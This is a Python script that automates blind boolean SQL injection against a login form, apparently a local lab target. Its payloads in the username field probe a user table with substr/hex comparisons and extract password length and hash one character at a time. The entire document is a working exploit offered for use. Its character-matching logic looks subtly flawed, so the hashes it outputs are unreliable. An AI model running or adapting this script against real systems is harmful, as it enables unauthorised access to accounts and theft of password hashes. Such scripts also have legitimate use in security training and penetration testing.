import requests

total_queries = 0
charset = "0123456789abcdef" #used 0-9 and a-f as the data format we will be extracting is hash sums stored in hex format
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload): # identify from response whether request was valid or invalid
    global total_queries
    r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"): # creates a boolean query that identifies at a certain offset if a character is valid
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id): # checks if user_id is valid
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

def password_length(user_id): # identifies the length of a user password
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

def extract_hash(charset, user_id, password_length): # extracts a user password
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))

while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} has length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
